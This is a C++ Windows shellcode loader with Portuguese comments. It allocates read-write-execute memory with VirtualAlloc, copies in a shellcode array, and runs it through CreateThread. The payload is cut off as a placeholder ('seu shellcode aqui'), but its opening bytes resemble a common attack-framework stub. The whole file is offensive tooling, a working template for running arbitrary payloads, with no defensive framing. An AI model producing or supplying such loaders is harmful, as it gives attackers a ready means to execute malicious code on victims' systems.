#include <windows.h>
#include <iostream>

unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8..."; // Seu shellcode aqui

int main() {
    // Alocação correta de memória com permissão de execução
    void* exec = VirtualAlloc(nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (exec == nullptr) {
        std::cerr << "Falha ao alocar memoria." << std::endl;
        return 1;
    }

    // Copia o shellcode para a memória alocada
    memcpy(exec, shellcode, sizeof(shellcode));

    // Cria a thread para executar o shellcode
    HANDLE thread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)exec, nullptr, 0, nullptr);

    if (thread == nullptr) {
        std::cerr << "Falha ao criar thread." << std::endl;
        return 1;
    }

    // Aguarda a execução terminar
    WaitForSingleObject(thread, INFINITE);

    CloseHandle(thread);
    return 0;
}
